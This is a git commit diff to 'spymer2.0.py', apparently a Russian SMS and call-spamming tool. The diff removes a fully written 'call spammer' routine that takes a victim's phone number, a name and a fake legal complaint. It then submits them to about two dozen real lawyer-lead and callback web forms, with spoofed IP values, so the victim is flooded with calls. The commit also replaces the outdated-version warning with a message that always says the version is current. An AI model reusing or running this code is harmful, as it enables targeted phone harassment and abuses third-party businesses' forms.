cd771202464e35c4b64565de4bc322a5c01c7f3b
vagon4ik <64847814+vagon4ik@users.noreply.github.com>
2020-06-22 13:02:36 +0300

    Update spymer2.0.py

--- spymer2.0.py
+++ spymer2.0.py
@@ -20,7 +20,7 @@ def Main():
 	ver = '77'
 	version = requests.post("https://fsystem88.ru/spymer/version.php").json()["version"]
 	if int(ver) < int(version):
-		info = Back.RED+"\nВерсия устарела и нуждается в обновлении!"+Style.RESET_ALL
+		info = Back.BLUE+"\nВаша версия актуальна!"+Style.RESET_ALL
 	else:
 		info = " "
 	proxy = "localhost"
@@ -38,9 +38,8 @@ def Main():
 			print ("1) СМС спамер.")
 			print("2) Добавить телефон в антиспам лист.")
 			print("3) Проверить телефон в антиспам листе.")
-			print("4) Спамер звонков (beta, RU).")
-			print("5) Обновить прокси.")
-			print("7) Выход.")
+			print("4) Обновить прокси.")
+			print("5) Выход.")
 			input1 = input(Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
 			if input1 == "1":
 				os.system('cls' if os.name=='nt' else 'clear')
@@ -1118,246 +1117,7 @@ def Main():
 							info = Fore.RED+"\nТелефон {} не находится в антиспам листе.".format(phone)+Style.RESET_ALL
 				except:
 					info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL
-			
 			elif input1 == "4":
-				try:
-					print("Введите  номер:")
-					phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-					try:
-						if int(phone):
-							print("Введите имя:")
-							name = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-							if name == "":
-								info = Fore.RED+"\nIncorrect name entered!"+Style.RESET_ALL
-								main()
-							print("Введите жалобу (обращение, которое потерпевший якобы адресует адвокатам):")
-							text = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-							if text == "":
-								info = Fore.RED+"\nНекорректно введена жалоба!"+Style.RESET_ALL
-								main()
-							try:
-								_phone=phone
-								_text=text
-								_name=name
-								if _phone[0] == '+':
-									_phone = _phone[1:]
-								if _phone[0] == '8':
-									_phone = '7'+_phone[1:]
-								if _phone[0] == '9':
-									_phone = '7'+_phone
-								id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': _phone}).json()["id"]
-								if int(id) > 0:
-									info = Fore.RED+"\nТелефон находится в антиспам листе."+Style.RESET_ALL
-									main()
-								elif int(id)==0:
-									_email = ''
-									for x in range(12):
-										_email = _email + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-									_phoneVodaonline = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7 (999) 666-99-33'
-									_phoneBukvaprava = _phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '7(777)777-77-77'
-									
-									info="Телефон: {}\nИмя: {}\nЖалоба: {}\nСпамер запущен.\nДля отмены нажмите Ctrl+C".format(phone, name, text)
-									os.system('cls' if os.name=='nt' else 'clear')
-									print(logo)
-									print(info)
-									proxies=None
-									try:
-										try:
-											vodaonline = requests.post('https://www.vodaonline.ru/local/components/shantilab/feedback.form/ajax.php', data={'sessid': '*', 'NAME': _name, 'PHONE': _phoneVodaonline}, proxies=proxies)
-											if vodaonline.status_code == 200:
-												print(Fore.GREEN + 'www.vodaonline.ru: sent')
-											else:
-												print(Fore.RED + 'www.vodaonline.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											yurmoscow = requests.post('https://yur-moscow.ru/ajax_call_me.php', data={'param1': _phone, 'param3': _text, 'param2': _name}, proxies=proxies)
-											if yurmoscow.status_code == 200:
-												print(Fore.GREEN + 'yur-moscow.ru: sent')
-											else:
-												print(Fore.RED + 'yur-moscow.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											bukvaprava = requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php', data={'text_quest_banner': _text,'name': _name,'city':'Москва','tel': _phoneBukvaprava,'ip':'192.168.1.777','form_page':'https://bukvaprava.ru/','referer':'','action':'ajax-lead'}, proxies=proxies)
-											if bukvaprava.status_code == 200:
-												print(Fore.GREEN + 'bukvaprava.ru: sent')
-											else:
-												print(Fore.RED + 'bukvaprava.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											yuristonline = requests.post('https://www.yurist-online.net/lead_question', data={'region':'27','question': _text,'name': _name,'phone': _phone,'email':'','partner_id':'13'}, proxies=proxies)
-											if yuristonline.status_code == 200:
-												print(Fore.GREEN + 'www.yurist-online.net: sent')
-											else:
-												print(Fore.RED + 'www.yurist-online.net: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											blablabla = requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php', data={'custom_U22127':_phoneVodaonline}, proxies=proxies)
-											if blablabla.status_code == 200:
-												print(Fore.GREEN + 'юрист-авгрупп.рф: sent')
-											else:
-												print(Fore.RED + 'юрист-авгрупп.рф: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''}, proxies=proxies)
-											if nicecream.status_code == 200:
-												print(Fore.GREEN + 'nice-cream.ru: sent')
-											else:
-												print(Fore.RED + 'nice-cream.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:4]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'}, proxies=proxies)
-											if rossovet.status_code == 200:
-												print(Fore.GREEN + 'rossovet.ru: sent')
-											else:
-												print(Fore.RED + 'rossovet.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											yuridkons = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text}, proxies=proxies)
-											if yuridkons.status_code == 200:
-												print(Fore.GREEN + 'yuridicheskaya-konsultaciya.com: sent')
-											else:
-												print(Fore.RED + 'yuridicheskaya-konsultaciya.com: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Москва','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'}, proxies=proxies)
-											if epleads.status_code == 200:
-												print(Fore.GREEN + 'epleads.ru: sent')
-											else:
-												print(Fore.RED + 'epleads.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											pravonedv = requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1', data={'email': _email+'@mail.ru','phone': _phoneVodaonline,'location': 'Москва, Россия','name': _name,'offer': '0','ip': '263.87.162.98','device': 'desktop','token': '*','template': 'two_page3','referrer': 'https://yandex.ru/clck/','domain': 'pravonedv.ru','wm_id': '548','url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'}, proxies=proxies)
-											if pravonedv.status_code == 200:
-												print(Fore.GREEN + 'pravonedv.ru: sent')
-											else:
-												print(Fore.RED + 'pravonedv.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											rdftgbhnj = requests.post('https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback', data={'_wpcf7': '295','_wpcf7_version': '5.0.5','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f295-o2','_wpcf7_container_post': '0','text-838': _name,'tel-231': _phone,'textarea-472': _text,'hidden-278': 'Главная'}, proxies=proxies)
-											if rdftgbhnj.status_code == 200:
-												print(Fore.GREEN + 'гос-юристы.рф: sent')
-											else:
-												print(Fore.RED + 'гос-юристы.рф: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											gurist = requests.post('http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback', data={'_wpcf7': '3591','_wpcf7_version': '5.0','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f3591-o1','_wpcf7_container_post': '0','your-name': _name,'tel-147': _text}, proxies=proxies)
-											if gurist.status_code == 200:
-												print(Fore.GREEN + 'gurist.ru: sent')
-											else:
-												print(Fore.RED + 'gurist.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											beeline = requests.post('https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/', data={'leadName':'PodborSim','phone':_phone[1:11],'region':'98140'}, proxies=proxies)
-											if beeline.status_code == 200:
-												print(Fore.GREEN + 'moskva.beeline.ru: sent')
-											else:
-												print(Fore.RED + 'moskva.beeline.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											advokatmakeev = requests.post('https://advokatmakeev.ru/form.php', data={'oname': _name,'otel': _phoneVodaonline,'omail': '','omess': _text,'otype': '1'}, proxies=proxies)
-											if advokatmakeev.status_code == 200:
-												print(Fore.GREEN + 'advokatmakeev.ru: sent')
-											else:
-												print(Fore.RED + 'advokatmakeev.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											mkamsk = requests.post('http://mkamsk.ru/apply_auto_form', data={'Form[9]': _name,'Form[12]': _phone,'Form[11]': _text,'url': 'http://mkamsk.ru/','check': 'check'}, proxies=proxies)
-											if mkamsk.status_code == 200:
-												print(Fore.GREEN + 'mkamsk.ru: sent')
-											else:
-												print(Fore.RED + 'mkamsk.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											usachev = requests.post('https://usachev.vip/wp-admin/admin-ajax.php', data={'action': 'bazz_widget_action','phone': '+'+_phone,'name': ''}, proxies=proxies)
-											if usachev.status_code == 200:
-												print(Fore.GREEN + 'usachev.vip: sent')
-											else:
-												print(Fore.RED + 'usachev.vip: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											pravosfera = requests.post('http://pravo-sfera.ru/auxpage_zayavk/', data={'c_name': _name, 'c_tel' : _phoneVodaonline, 'quest': _text, 'uest_go': 'Задать вопрос'}, proxies=proxies)
-											if usachev.status_code == 200:
-												print(Fore.GREEN + 'pravo-sfera.ru: sent')
-											else:
-												print(Fore.RED + 'pravo-sfera.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											uristexpert24 = requests.post('https://urist-expert24.ru/send-lead/', data={'name': _name, 'phone': _phoneVodaonline, 'form-name': 'Заказ обратного звонка'}, proxies=proxies)
-											if uristexpert24.status_code == 200:
-												print(Fore.GREEN + 'urist-expert24.ru: sent')
-											else:
-												print(Fore.RED + 'urist-expert24.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											lawdivorce = requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php', data={'ip_address': '','ip_country': '','ip_region': '','ip_city': '','url': '','action': 'lld_send_lead','text': _text,'name': _name,'telephone': '+'+_phoneBukvaprava,'city': 'Москва'}, proxies=proxies)
-											if lawdivorce.status_code == 200:
-												print(Fore.GREEN + 'law-divorce.ru: sent')
-											else:
-												print(Fore.RED + 'law-divorce.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											gosurist = requests.post('http://www.gos-urist.ru/send.php', {'name': _name, 'code': _phone[1:4], 'phone': _phone[4:11], 'issue': _text}, proxies=proxies)
-											if gosurist.status_code == 200:
-												print(Fore.GREEN + 'www.gos-urist.ru: sent')
-											else:
-												print(Fore.RED + 'www.gos-urist.ruчё: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											ur9911030 = requests.post('http://9911030.ru/orderform.php', {'name': _name, 'phone': _phone, 'message': _text}, proxies=proxies)
-											if ur9911030.status_code == 200:
-												print(Fore.GREEN + '9911030.ru: sent')
-											else:
-												print(Fore.RED + '9911030.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											findclone = requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone}, proxies=proxies)
-											if ur9911030.status_code == 200:
-												print(Fore.GREEN + 'findclone.ru: sent')
-											else:
-												print(Fore.RED + 'findclone.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										print(Style.RESET_ALL)
-									except KeyboardInterrupt:
-										info = Fore.RED+"\nОтменено."+Style.RESET_ALL
-										main()
-									except:
-										pass
-									info = Fore.BLUE+"\nГотово."+Style.RESET_ALL
-									print(Fore.BLUE+"Готово."+Style.RESET_ALL)
-									time.sleep(5)
-							except:
-								info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
-					
-					except:
-						info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL
-				except KeyboardInterrupt:
-					info = Fore.RED+"\nОтменено!"+Style.RESET_ALL
-				except:
-					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
-			
-			elif input1 == "5":
 				try:
 					print ("Введите http(s)://IP:port proxy.")
 					print ("Пример: "+Fore.GREEN+"https://123.45.6.78:8080"+Style.RESET_ALL)
@@ -1378,7 +1138,7 @@ def Main():
 				except:
 					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
 					proxy = "localhost"
-			elif input1 == "7":
+			elif input1 == "5":
 				print (Fore.BLUE+"\nДо скорой встречи!)\n"+Style.RESET_ALL)
 				exit()
 	main()
